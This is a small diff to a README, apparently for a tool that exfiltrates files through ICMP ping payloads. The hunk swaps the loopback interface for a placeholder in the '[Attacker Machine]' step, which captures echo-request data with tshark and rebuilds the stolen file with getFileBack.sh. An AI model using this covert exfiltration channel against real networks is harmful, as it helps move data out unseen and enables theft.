@@ -16,7 +16,7 @@ Steps:
     rm tmp
 
 [Attacker Machine]
-    (sudo) tshark -i lo -f 'icmp[0] == 8' -e data -Tjson > tout.json # You need to run this as root
+    (sudo) tshark -i <interface> -f 'icmp[0] == 8' -e data -Tjson > tout.json # You need to run this as root
     ./getFileBack.sh <final File>
 ```
 
